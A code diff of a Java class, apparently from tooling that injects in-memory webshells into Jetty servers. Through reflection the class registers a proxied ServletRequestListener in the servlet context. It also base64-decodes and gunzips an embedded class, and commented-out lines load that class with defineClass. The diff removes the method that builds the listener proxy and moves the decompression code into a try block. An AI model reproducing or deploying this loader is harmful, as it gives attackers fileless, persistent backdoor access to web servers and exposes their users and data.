@@ -87,8 +87,6 @@ public class JettyListenerThreadLoader {
 
 
         invokeMethod(servletContext.getClass().getSuperclass(), servletContext, "addEventListener", new Class[]{Class.forName("java.util.EventListener")}, new Object[]{object});
-
-
     }
 
     public static Object getServletContext() throws Exception {
@@ -122,43 +120,11 @@ public class JettyListenerThreadLoader {
         return null;
     }
 
-    public static Object getObject() throws Exception {
-        // 动态代理兼容 javax jakarta
-        Class listenerClass = null;
-        try {
-            listenerClass = Class.forName("jakarta.servlet.ServletRequestListener");
-        } catch (Exception e) {
-            try {
-                listenerClass = Class.forName("javax.servlet.ServletRequestListener");
-            } catch (ClassNotFoundException ex) {
-
-            }
-        }
-
-//        byte[] bytes = decompress(gzipObject);
-//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
-//        defineClass.setAccessible(true);
-//        Class clazz;
-//        try {
-//            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
-//        } catch (Exception e) {
-//            clazz = classLoader.loadClass(CLASSNAME);
-//        }
-
-        Class clazz = Class.forName(CLASSNAME);
-        Object javaObject = clazz.newInstance();
-        Object object = Proxy.newProxyInstance(listenerClass.getClassLoader(), new Class[]{listenerClass}, (InvocationHandler) javaObject);
-
-        return object;
-    }
-
-
     // tools
     public static byte[] decompress(String gzipObject) throws IOException {
-        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
-        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
         try {
+            final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
+            ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
             GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             byte[] buffer = new byte[1024];
